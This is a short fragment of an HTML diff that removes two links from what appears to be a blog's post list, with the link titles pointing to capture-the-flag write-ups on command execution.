-        <a href="/2023/09/28/CTFSHOW-extremeRCE-wp/" ><i class="fa fa-file-o"></i>CTFSHOW 极限命令执行 wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/09/26/HNCTF2022-Canyource-wp/" ><i class="fa fa-file-o"></i>HNCTF2022-week2-Canyource-wp</a>
       </li>
     
   </ul>
